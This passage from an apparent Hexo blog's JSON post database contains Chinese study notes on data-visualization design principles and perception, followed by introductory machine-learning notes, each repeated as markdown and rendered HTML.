相似原则：形状、大小、颜色等属性相似时更容易被看作是一个整体；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/c66cc71e223ca688.jpg)\n\n- 连续性原则：观察师傅的时候回很自然的沿着物体的边界，将不连续的物体视为连续的整体；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/3c9504bd2d3fc1cb.jpg)\n\n-  闭合性原则：有些图形本身不是闭合的名单时主体倾向闭合；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/1bad0530b6e85e67.jpg)\n\n- 共势原则：如果一个对象中的一部分都向共同的方向去运动，那么共同的部分就容易被感知；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/7f5ee721448a7331.jpg)\n\n- 对称性原则：堆成的数据视为同一组；\n- 图形与背景关系原则：大脑通常认为构图中最小的物体是图形，更大的是背景；相比于凹面，凸面与图形相关联更多；\n\n### 7.视觉编码\n\n> 将数据信息（属性+值）映射成可视化元素（可视化符号+视觉通道）的技术；\n\n### 1.可视化符号\n\n- 点、线、面表示元素\n- 闭包、连线表示关系\n\n### 2.视觉通道\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/334060202691f9df.jpg)\n\n### 3.视觉编码的优先级\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/a1ced555ecc5c0b6.jpg)\n\n## 三、可视化工具\n\n- D3.js：最好的之一；\n- Vega：声明式的语言，可以用JSON描述可视化的视觉外观和交互行为；\n- G2：图形语法库（没有图表类型的概念）\n- Echarts（强图表类型）\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/数据可视化基础.md","raw":"---\ntitle: 数据可视化\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 可视化\n    - 笔记\nmp3: \ncover: img/bg10.jpg\n---\n\n\n# 数据可视化\n\n## 一、什么是数据可视化？\n\n> Anything that converts data into a visual representation. \n>\n> Charts\\Graphs\\Maps\\Tables...\n\n### 1.数据可视化分类\n\n- 科学可视化：科学实验数据的直观展示；\n- 信息可视化：对抽象数据的直观展示；\n- 可视分析：对分析结果的直观展示，及交互式反馈，跨学科；\n\n### 2.为社么需要数据可视化？\n\n- 记录信息；\n- 分析推理；\n- 证实假设；\n- 交流思想；\n\n## 二、可视化设计原则和方法\n\n- 糟糕的可视化\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/047ff6801801a0ae.jpg)\n\n- 错误的可视化\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/49b2ca22ec9c3ff1.jpg)\n\n### 1.可视化设计原则\n\n> 能够正确的表达数据中的信息而不产生偏差与歧义；\n\n### 2.透视失真\n\n- 如果数字是由视觉元素表示的，那么他们应该与是视觉元素的感知程度成正比；\n- 使用清晰、详细和彻底的标签，以避免图形失真和含糊不清；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/e9ae1811c30f03fd.jpg)\n\n> 绿色部分的数据小于蓝色部分，但是视觉上绿色接近于蓝色；\n\n### 3.图形设计&数据尺度\n\n> 图形的每一部分都会产生对其的视觉预期；\n\n- 预期往往决定了眼睛实际看到的东西；\n- 错误的数据洞察，产生于在图形的某个地方不正确的视觉预期；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/4f7068afb0f91c60.jpg)\n\n> 数据的刻度分布不均匀；\n\n### 4.数据上下文\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/1af9dfd1933e4bc4.jpg)\n\n> 数据范围显示不全，导致误解；\n\n### 5.可视化设计原则\n\n- 准确的展示数据\n- 节省笔墨\n- 节省空间\n- 消除不必要的无价值图形\n- 在最短的事件传达最多的信息\n\n##### Data-ink Ratio\n\n- 数据墨水：可视化图形中不可擦除的核心部分；\n- 最大化数据墨水占比：可视化图形由墨水+空白区域构成；\n- 擦除数据墨水将会减少图形所传达的信息量；\n\n$$\nData-ink-ratio=Data-ink/Total-ink-used-to-print-the-graphics\n$$\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/08a573bf6afb2dff.jpg)\n\n### 6.视觉感知\n\n##### 相对判断和视觉假象\n\n> 人类的视觉系统管擦的是变化而不是绝对值，且容易被边界吸引；\n\n##### 格式塔学派\n\n> 整体决定了部分的性质，部分依从于整体；\n>\n> 结构比元素重要，视觉形象首先作为统一的整体被认知；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/76fa7f84b9de92b5.jpg)\n\n- 就近原则：视觉元素空间距离上相近时，人们倾向于归于一组；同理，将数据元素放在靠近的位置，可以突出关联性；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/643b5bf9da7aff3b.jpg)\n\n- 相似原则：形状、大小、颜色等属性相似时更容易被看作是一个整体；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/c66cc71e223ca688.jpg)\n\n- 连续性原则：观察师傅的时候回很自然的沿着物体的边界，将不连续的物体视为连续的整体；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/3c9504bd2d3fc1cb.jpg)\n\n-  闭合性原则：有些图形本身不是闭合的名单时主体倾向闭合；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/1bad0530b6e85e67.jpg)\n\n- 共势原则：如果一个对象中的一部分都向共同的方向去运动，那么共同的部分就容易被感知；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/7f5ee721448a7331.jpg)\n\n- 对称性原则：堆成的数据视为同一组；\n- 图形与背景关系原则：大脑通常认为构图中最小的物体是图形，更大的是背景；相比于凹面，凸面与图形相关联更多；\n\n### 7.视觉编码\n\n> 将数据信息（属性+值）映射成可视化元素（可视化符号+视觉通道）的技术；\n\n### 1.可视化符号\n\n- 点、线、面表示元素\n- 闭包、连线表示关系\n\n### 2.视觉通道\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/334060202691f9df.jpg)\n\n### 3.视觉编码的优先级\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/a1ced555ecc5c0b6.jpg)\n\n## 三、可视化工具\n\n- D3.js：最好的之一；\n- Vega：声明式的语言，可以用JSON描述可视化的视觉外观和交互行为；\n- G2：图形语法库（没有图表类型的概念）\n- Echarts（强图表类型）\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"数据可视化基础","published":1,"updated":"2023-03-27T11:05:51.744Z","_id":"clg29vyhy005kao9c8ghz2bj5","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"数据可视化\"><a href=\"#数据可视化\" class=\"headerlink\" title=\"数据可视化\"></a>数据可视化</h1><h2 id=\"一、什么是数据可视化？\"><a href=\"#一、什么是数据可视化？\" class=\"headerlink\" title=\"一、什么是数据可视化？\"></a>一、什么是数据可视化？</h2><blockquote>\n<p>Anything that converts data into a visual representation. </p>\n<p>Charts\\Graphs\\Maps\\Tables…</p>\n</blockquote>\n<h3 id=\"1-数据可视化分类\"><a href=\"#1-数据可视化分类\" class=\"headerlink\" title=\"1.数据可视化分类\"></a>1.数据可视化分类</h3><ul>\n<li>科学可视化：科学实验数据的直观展示；</li>\n<li>信息可视化：对抽象数据的直观展示；</li>\n<li>可视分析：对分析结果的直观展示，及交互式反馈，跨学科；</li>\n</ul>\n<h3 id=\"2-为社么需要数据可视化？\"><a href=\"#2-为社么需要数据可视化？\" class=\"headerlink\" title=\"2.为社么需要数据可视化？\"></a>2.为社么需要数据可视化？</h3><ul>\n<li>记录信息；</li>\n<li>分析推理；</li>\n<li>证实假设；</li>\n<li>交流思想；</li>\n</ul>\n<h2 id=\"二、可视化设计原则和方法\"><a href=\"#二、可视化设计原则和方法\" class=\"headerlink\" title=\"二、可视化设计原则和方法\"></a>二、可视化设计原则和方法</h2><ul>\n<li>糟糕的可视化</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/047ff6801801a0ae.jpg\"></p>\n<ul>\n<li>错误的可视化</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/49b2ca22ec9c3ff1.jpg\"></p>\n<h3 id=\"1-可视化设计原则\"><a href=\"#1-可视化设计原则\" class=\"headerlink\" title=\"1.可视化设计原则\"></a>1.可视化设计原则</h3><blockquote>\n<p>能够正确的表达数据中的信息而不产生偏差与歧义；</p>\n</blockquote>\n<h3 id=\"2-透视失真\"><a href=\"#2-透视失真\" class=\"headerlink\" title=\"2.透视失真\"></a>2.透视失真</h3><ul>\n<li>如果数字是由视觉元素表示的，那么他们应该与是视觉元素的感知程度成正比；</li>\n<li>使用清晰、详细和彻底的标签，以避免图形失真和含糊不清；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/e9ae1811c30f03fd.jpg\"></p>\n<blockquote>\n<p>绿色部分的数据小于蓝色部分，但是视觉上绿色接近于蓝色；</p>\n</blockquote>\n<h3 id=\"3-图形设计-amp-数据尺度\"><a href=\"#3-图形设计-amp-数据尺度\" class=\"headerlink\" title=\"3.图形设计&amp;数据尺度\"></a>3.图形设计&amp;数据尺度</h3><blockquote>\n<p>图形的每一部分都会产生对其的视觉预期；</p>\n</blockquote>\n<ul>\n<li>预期往往决定了眼睛实际看到的东西；</li>\n<li>错误的数据洞察，产生于在图形的某个地方不正确的视觉预期；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/4f7068afb0f91c60.jpg\"></p>\n<blockquote>\n<p>数据的刻度分布不均匀；</p>\n</blockquote>\n<h3 id=\"4-数据上下文\"><a href=\"#4-数据上下文\" class=\"headerlink\" title=\"4.数据上下文\"></a>4.数据上下文</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/1af9dfd1933e4bc4.jpg\"></p>\n<blockquote>\n<p>数据范围显示不全，导致误解；</p>\n</blockquote>\n<h3 id=\"5-可视化设计原则\"><a href=\"#5-可视化设计原则\" class=\"headerlink\" title=\"5.可视化设计原则\"></a>5.可视化设计原则</h3><ul>\n<li>准确的展示数据</li>\n<li>节省笔墨</li>\n<li>节省空间</li>\n<li>消除不必要的无价值图形</li>\n<li>在最短的事件传达最多的信息</li>\n</ul>\n<h5 id=\"Data-ink-Ratio\"><a href=\"#Data-ink-Ratio\" class=\"headerlink\" title=\"Data-ink Ratio\"></a>Data-ink Ratio</h5><ul>\n<li>数据墨水：可视化图形中不可擦除的核心部分；</li>\n<li>最大化数据墨水占比：可视化图形由墨水+空白区域构成；</li>\n<li>擦除数据墨水将会减少图形所传达的信息量；</li>\n</ul>\n<p>$$<br>Data-ink-ratio=Data-ink/Total-ink-used-to-print-the-graphics<br>$$</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/08a573bf6afb2dff.jpg\"></p>\n<h3 id=\"6-视觉感知\"><a href=\"#6-视觉感知\" class=\"headerlink\" title=\"6.视觉感知\"></a>6.视觉感知</h3><h5 id=\"相对判断和视觉假象\"><a href=\"#相对判断和视觉假象\" class=\"headerlink\" title=\"相对判断和视觉假象\"></a>相对判断和视觉假象</h5><blockquote>\n<p>人类的视觉系统管擦的是变化而不是绝对值，且容易被边界吸引；</p>\n</blockquote>\n<h5 id=\"格式塔学派\"><a href=\"#格式塔学派\" class=\"headerlink\" title=\"格式塔学派\"></a>格式塔学派</h5><blockquote>\n<p>整体决定了部分的性质，部分依从于整体；</p>\n<p>结构比元素重要，视觉形象首先作为统一的整体被认知；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/76fa7f84b9de92b5.jpg\"></p>\n<ul>\n<li>就近原则：视觉元素空间距离上相近时，人们倾向于归于一组；同理，将数据元素放在靠近的位置，可以突出关联性；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/643b5bf9da7aff3b.jpg\"></p>\n<ul>\n<li>相似原则：形状、大小、颜色等属性相似时更容易被看作是一个整体；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/c66cc71e223ca688.jpg\"></p>\n<ul>\n<li>连续性原则：观察师傅的时候回很自然的沿着物体的边界，将不连续的物体视为连续的整体；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/3c9504bd2d3fc1cb.jpg\"></p>\n<ul>\n<li> 闭合性原则：有些图形本身不是闭合的名单时主体倾向闭合；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/1bad0530b6e85e67.jpg\"></p>\n<ul>\n<li>共势原则：如果一个对象中的一部分都向共同的方向去运动，那么共同的部分就容易被感知；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/7f5ee721448a7331.jpg\"></p>\n<ul>\n<li>对称性原则：堆成的数据视为同一组；</li>\n<li>图形与背景关系原则：大脑通常认为构图中最小的物体是图形，更大的是背景；相比于凹面，凸面与图形相关联更多；</li>\n</ul>\n<h3 id=\"7-视觉编码\"><a href=\"#7-视觉编码\" class=\"headerlink\" title=\"7.视觉编码\"></a>7.视觉编码</h3><blockquote>\n<p>将数据信息（属性+值）映射成可视化元素（可视化符号+视觉通道）的技术；</p>\n</blockquote>\n<h3 id=\"1-可视化符号\"><a href=\"#1-可视化符号\" class=\"headerlink\" title=\"1.可视化符号\"></a>1.可视化符号</h3><ul>\n<li>点、线、面表示元素</li>\n<li>闭包、连线表示关系</li>\n</ul>\n<h3 id=\"2-视觉通道\"><a href=\"#2-视觉通道\" class=\"headerlink\" title=\"2.视觉通道\"></a>2.视觉通道</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/334060202691f9df.jpg\"></p>\n<h3 id=\"3-视觉编码的优先级\"><a href=\"#3-视觉编码的优先级\" class=\"headerlink\" title=\"3.视觉编码的优先级\"></a>3.视觉编码的优先级</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/a1ced555ecc5c0b6.jpg\"></p>\n<h2 id=\"三、可视化工具\"><a href=\"#三、可视化工具\" class=\"headerlink\" title=\"三、可视化工具\"></a>三、可视化工具</h2><ul>\n<li>D3.js：最好的之一；</li>\n<li>Vega：声明式的语言，可以用JSON描述可视化的视觉外观和交互行为；</li>\n<li>G2：图形语法库（没有图表类型的概念）</li>\n<li>Echarts（强图表类型）</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"数据可视化\"><a href=\"#数据可视化\" class=\"headerlink\" title=\"数据可视化\"></a>数据可视化</h1><h2 id=\"一、什么是数据可视化？\"><a href=\"#一、什么是数据可视化？\" class=\"headerlink\" title=\"一、什么是数据可视化？\"></a>一、什么是数据可视化？</h2><blockquote>\n<p>Anything that converts data into a visual representation. </p>\n<p>Charts\\Graphs\\Maps\\Tables…</p>\n</blockquote>\n<h3 id=\"1-数据可视化分类\"><a href=\"#1-数据可视化分类\" class=\"headerlink\" title=\"1.数据可视化分类\"></a>1.数据可视化分类</h3><ul>\n<li>科学可视化：科学实验数据的直观展示；</li>\n<li>信息可视化：对抽象数据的直观展示；</li>\n<li>可视分析：对分析结果的直观展示，及交互式反馈，跨学科；</li>\n</ul>\n<h3 id=\"2-为社么需要数据可视化？\"><a href=\"#2-为社么需要数据可视化？\" class=\"headerlink\" title=\"2.为社么需要数据可视化？\"></a>2.为社么需要数据可视化？</h3><ul>\n<li>记录信息；</li>\n<li>分析推理；</li>\n<li>证实假设；</li>\n<li>交流思想；</li>\n</ul>\n<h2 id=\"二、可视化设计原则和方法\"><a href=\"#二、可视化设计原则和方法\" class=\"headerlink\" title=\"二、可视化设计原则和方法\"></a>二、可视化设计原则和方法</h2><ul>\n<li>糟糕的可视化</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/047ff6801801a0ae.jpg\"></p>\n<ul>\n<li>错误的可视化</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/49b2ca22ec9c3ff1.jpg\"></p>\n<h3 id=\"1-可视化设计原则\"><a href=\"#1-可视化设计原则\" class=\"headerlink\" title=\"1.可视化设计原则\"></a>1.可视化设计原则</h3><blockquote>\n<p>能够正确的表达数据中的信息而不产生偏差与歧义；</p>\n</blockquote>\n<h3 id=\"2-透视失真\"><a href=\"#2-透视失真\" class=\"headerlink\" title=\"2.透视失真\"></a>2.透视失真</h3><ul>\n<li>如果数字是由视觉元素表示的，那么他们应该与是视觉元素的感知程度成正比；</li>\n<li>使用清晰、详细和彻底的标签，以避免图形失真和含糊不清；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/e9ae1811c30f03fd.jpg\"></p>\n<blockquote>\n<p>绿色部分的数据小于蓝色部分，但是视觉上绿色接近于蓝色；</p>\n</blockquote>\n<h3 id=\"3-图形设计-amp-数据尺度\"><a href=\"#3-图形设计-amp-数据尺度\" class=\"headerlink\" title=\"3.图形设计&amp;数据尺度\"></a>3.图形设计&amp;数据尺度</h3><blockquote>\n<p>图形的每一部分都会产生对其的视觉预期；</p>\n</blockquote>\n<ul>\n<li>预期往往决定了眼睛实际看到的东西；</li>\n<li>错误的数据洞察，产生于在图形的某个地方不正确的视觉预期；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/4f7068afb0f91c60.jpg\"></p>\n<blockquote>\n<p>数据的刻度分布不均匀；</p>\n</blockquote>\n<h3 id=\"4-数据上下文\"><a href=\"#4-数据上下文\" class=\"headerlink\" title=\"4.数据上下文\"></a>4.数据上下文</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/1af9dfd1933e4bc4.jpg\"></p>\n<blockquote>\n<p>数据范围显示不全，导致误解；</p>\n</blockquote>\n<h3 id=\"5-可视化设计原则\"><a href=\"#5-可视化设计原则\" class=\"headerlink\" title=\"5.可视化设计原则\"></a>5.可视化设计原则</h3><ul>\n<li>准确的展示数据</li>\n<li>节省笔墨</li>\n<li>节省空间</li>\n<li>消除不必要的无价值图形</li>\n<li>在最短的事件传达最多的信息</li>\n</ul>\n<h5 id=\"Data-ink-Ratio\"><a href=\"#Data-ink-Ratio\" class=\"headerlink\" title=\"Data-ink Ratio\"></a>Data-ink Ratio</h5><ul>\n<li>数据墨水：可视化图形中不可擦除的核心部分；</li>\n<li>最大化数据墨水占比：可视化图形由墨水+空白区域构成；</li>\n<li>擦除数据墨水将会减少图形所传达的信息量；</li>\n</ul>\n<p>$$<br>Data-ink-ratio=Data-ink/Total-ink-used-to-print-the-graphics<br>$$</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/08a573bf6afb2dff.jpg\"></p>\n<h3 id=\"6-视觉感知\"><a href=\"#6-视觉感知\" class=\"headerlink\" title=\"6.视觉感知\"></a>6.视觉感知</h3><h5 id=\"相对判断和视觉假象\"><a href=\"#相对判断和视觉假象\" class=\"headerlink\" title=\"相对判断和视觉假象\"></a>相对判断和视觉假象</h5><blockquote>\n<p>人类的视觉系统管擦的是变化而不是绝对值，且容易被边界吸引；</p>\n</blockquote>\n<h5 id=\"格式塔学派\"><a href=\"#格式塔学派\" class=\"headerlink\" title=\"格式塔学派\"></a>格式塔学派</h5><blockquote>\n<p>整体决定了部分的性质，部分依从于整体；</p>\n<p>结构比元素重要，视觉形象首先作为统一的整体被认知；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/76fa7f84b9de92b5.jpg\"></p>\n<ul>\n<li>就近原则：视觉元素空间距离上相近时，人们倾向于归于一组；同理，将数据元素放在靠近的位置，可以突出关联性；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/643b5bf9da7aff3b.jpg\"></p>\n<ul>\n<li>相似原则：形状、大小、颜色等属性相似时更容易被看作是一个整体；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/c66cc71e223ca688.jpg\"></p>\n<ul>\n<li>连续性原则：观察师傅的时候回很自然的沿着物体的边界，将不连续的物体视为连续的整体；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/3c9504bd2d3fc1cb.jpg\"></p>\n<ul>\n<li> 闭合性原则：有些图形本身不是闭合的名单时主体倾向闭合；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/1bad0530b6e85e67.jpg\"></p>\n<ul>\n<li>共势原则：如果一个对象中的一部分都向共同的方向去运动，那么共同的部分就容易被感知；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/7f5ee721448a7331.jpg\"></p>\n<ul>\n<li>对称性原则：堆成的数据视为同一组；</li>\n<li>图形与背景关系原则：大脑通常认为构图中最小的物体是图形，更大的是背景；相比于凹面，凸面与图形相关联更多；</li>\n</ul>\n<h3 id=\"7-视觉编码\"><a href=\"#7-视觉编码\" class=\"headerlink\" title=\"7.视觉编码\"></a>7.视觉编码</h3><blockquote>\n<p>将数据信息（属性+值）映射成可视化元素（可视化符号+视觉通道）的技术；</p>\n</blockquote>\n<h3 id=\"1-可视化符号\"><a href=\"#1-可视化符号\" class=\"headerlink\" title=\"1.可视化符号\"></a>1.可视化符号</h3><ul>\n<li>点、线、面表示元素</li>\n<li>闭包、连线表示关系</li>\n</ul>\n<h3 id=\"2-视觉通道\"><a href=\"#2-视觉通道\" class=\"headerlink\" title=\"2.视觉通道\"></a>2.视觉通道</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/334060202691f9df.jpg\"></p>\n<h3 id=\"3-视觉编码的优先级\"><a href=\"#3-视觉编码的优先级\" class=\"headerlink\" title=\"3.视觉编码的优先级\"></a>3.视觉编码的优先级</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/13/a1ced555ecc5c0b6.jpg\"></p>\n<h2 id=\"三、可视化工具\"><a href=\"#三、可视化工具\" class=\"headerlink\" title=\"三、可视化工具\"></a>三、可视化工具</h2><ul>\n<li>D3.js：最好的之一；</li>\n<li>Vega：声明式的语言，可以用JSON描述可视化的视觉外观和交互行为；</li>\n<li>G2：图形语法库（没有图表类型的概念）</li>\n<li>Echarts（强图表类型）</li>\n</ul>\n"},{"title":"机器学习-CH1-绪论","date":"2020-11-05T12:56:45.000Z","mp3":null,"cover":"img/machinelearning.jpg","_content":"\n## 一、引言\n\n\t机器学习致力于研究如何通过计算的手段，利用经验来改善系统性能。\n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20201105204318313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n## 二、基本术语\n\n## 1.数据\n\n\t\t训练集=特征+标记\n\t\t测试集=特征+？\n\n## 2.任务\n\n\t\t分类（离散值）：二分类，多分类。\n\t\t回归（连续值）\n\t\t聚类（无标记信息）\n\t\t\t有无标记信息：\n\t\t\t\ta、监督学习：分类、回归\n\t\t\t\tb、无监督学习：聚类\n\t\t\t\tc、半监督学习：两者结合\n\t\n\n## 3.泛化能力\n\n\t\t模型适用于新样本的能力\n\n## 三、假设空间\n\n\t\tN=特征数|*特征可能值数|*样本数+测试样本数\n\n## 四、归纳偏好\n\n\t\t1.学习过程中对某种类型假设的偏好。\n\t\t2.”奥卡姆剃刀“：若有多个假设与观察一致，选最简单的那个。\n\n## 五、发展\n\n\t\n\n## 1.符号主义学习\n\n\t\t决策树、逻辑\n\n## 2.连接主义\n\n\t\t神经网络\n\n## 3.统计学习\n\n\t\t支持向量机、核方法\n","source":"_posts/机器学习-CH1-绪论.md","raw":"---\ntitle: 机器学习-CH1-绪论\ndate: 2020-11-5 20:56:45\ncategories: \n    - 计算机科学\ntags: \n    - 机器学习\nmp3: \ncover: img/machinelearning.jpg\n---\n\n## 一、引言\n\n\t机器学习致力于研究如何通过计算的手段，利用经验来改善系统性能。\n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20201105204318313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n## 二、基本术语\n\n## 1.数据\n\n\t\t训练集=特征+标记\n\t\t测试集=特征+？\n\n## 2.任务\n\n\t\t分类（离散值）：二分类，多分类。\n\t\t回归（连续值）\n\t\t聚类（无标记信息）\n\t\t\t有无标记信息：\n\t\t\t\ta、监督学习：分类、回归\n\t\t\t\tb、无监督学习：聚类\n\t\t\t\tc、半监督学习：两者结合\n\t\n\n## 3.泛化能力\n\n\t\t模型适用于新样本的能力\n\n## 三、假设空间\n\n\t\tN=特征数|*特征可能值数|*样本数+测试样本数\n\n## 四、归纳偏好\n\n\t\t1.学习过程中对某种类型假设的偏好。\n\t\t2.”奥卡姆剃刀“：若有多个假设与观察一致，选最简单的那个。\n\n## 五、发展\n\n\t\n\n## 1.符号主义学习\n\n\t\t决策树、逻辑\n\n## 2.连接主义\n\n\t\t神经网络\n\n## 3.统计学习\n\n\t\t支持向量机、核方法\n","slug":"机器学习-CH1-绪论","published":1,"updated":"2020-11-05T13:02:56.000Z","_id":"clg29vyi0005mao9cannn6zql","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"一、引言\"><a href=\"#一、引言\" class=\"headerlink\" title=\"一、引言\"></a>一、引言</h2><pre><code class=\"hljs\">机器学习致力于研究如何通过计算的手段，利用经验来改善系统性能。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201105204318313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n</code></pre>\n<h2 id=\"二、基本术语\"><a href=\"#二、基本术语\" class=\"headerlink\" title=\"二、基本术语\"></a>二、基本术语</h2><h2 id=\"1-数据\"><a href=\"#1-数据\" class=\"headerlink\" title=\"1.数据\"></a>1.数据</h2><pre><code class=\"hljs\">    训练集=特征+标记\n    测试集=特征+？\n</code></pre>\n<h2 id=\"2-任务\"><a href=\"#2-任务\" class=\"headerlink\" title=\"2.任务\"></a>2.任务</h2><pre><code class=\"hljs\">    分类（离散值）：二分类，多分类。\n    回归（连续值）\n    聚类（无标记信息）\n        有无标记信息：\n            a、监督学习：分类、回归\n            b、无监督学习：聚类\n            c、半监督学习：两者结合\n</code></pre>\n<h2 id=\"3-泛化能力\"><a href=\"#3-泛化能力\" class=\"headerlink\" title=\"3.泛化能力\"></a>3.泛化能力</h2><pre><code class=\"hljs\">    模型适用于新样本的能力\n</code></pre>\n<h2 id=\"三、假设空间\"><a href=\"#三、假设空间\" class=\"headerlink\" title=\"三、假设空间\"></a>三、假设空间</h2><pre><code class=\"hljs\">    N=特征数|*特征可能值数|*样本数+测试样本数\n</code></pre>\n<h2 id=\"四、归纳偏好\"><a href=\"#四、归纳偏好\" class=\"headerlink\" title=\"四、归纳偏好\"></a>四、归纳偏好</h2><pre><code class=\"hljs\">    1.学习过程中对某种类型假设的偏好。\n    2.”奥卡姆剃刀“：若有多个假设与观察一致，选最简单的那个。\n</code></pre>\n<h2 id=\"五、发展\"><a href=\"#五、发展\" class=\"headerlink\" title=\"五、发展\"></a>五、发展</h2><h2 id=\"1-符号主义学习\"><a href=\"#1-符号主义学习\" class=\"headerlink\" title=\"1.符号主义学习\"></a>1.符号主义学习</h2><pre><code class=\"hljs\">    决策树、逻辑\n</code></pre>\n<h2 id=\"2-连接主义\"><a href=\"#2-连接主义\" class=\"headerlink\" title=\"2.连接主义\"></a>2.连接主义</h2><pre><code class=\"hljs\">    神经网络\n</code></pre>\n<h2 id=\"3-统计学习\"><a href=\"#3-统计学习\" class=\"headerlink\" title=\"3.统计学习\"></a>3.统计学习</h2><pre><code class=\"hljs\">    支持向量机、核方法\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、引言\"><a href=\"#一、引言\" class=\"headerlink\" title=\"一、引言\"></a>一、引言</h2><pre><code>机器学习致力于研究如何通过计算的手段，利用经验来改善系统性能。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201105204318313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n</code></pre>\n<h2 id=\"二、基本术语\"><a href=\"#二、基本术语\" class=\"headerlink\" title=\"二、基本术语\"></a>二、基本术语</h2><h2 id=\"1-数据\"><a href=\"#1-数据\" class=\"headerlink\" title=\"1.数据\"></a>1.数据</h2><pre><code>    训练集=特征+标记\n    测试集=特征+？\n</code></pre>\n<h2 id=\"2-任务\"><a href=\"#2-任务\" class=\"headerlink\" title=\"2.任务\"></a>2.任务</h2><pre><code>    分类（离散值）：二分类，多分类。\n    回归（连续值）\n    聚类（无标记信息）\n        有无标记信息：\n            a、监督学习：分类、回归\n            b、无监督学习：聚类\n            c、半监督学习：两者结合\n</code></pre>\n<h2 id=\"3-泛化能力\"><a href=\"#3-泛化能力\" class=\"headerlink\" title=\"3.泛化能力\"></a>3.泛化能力</h2><pre><code>    模型适用于新样本的能力\n</code></pre>\n<h2 id=\"三、假设空间\"><a href=\"#三、假设空间\" class=\"headerlink\" title=\"三、假设空间\"></a>三、假设空间</h2><pre><code>    N=特征数|*特征可能值数|*样本数+测试样本数\n</code></pre>\n<h2 id=\"四、归纳偏好\"><a href=\"#四、归纳偏好\" class=\"headerlink\" title=\"四、归纳偏好\"></a>四、归纳偏好</h2><pre><code>    1.学习过程中对某种类型假设的偏好。\n    2.”奥卡姆剃刀“：若有多个假设与观察一致，选最简单的那个。\n</code></pre>\n<h2 id=\"五、发展\"><a href=\"#五、发展\" class=\"headerlink\" title=\"五、发展\"></a>五、发展</h2><h2 id=\"1-符号主义学习\"><a href=\"#1-符号主义学习\" class=\"headerlink\" 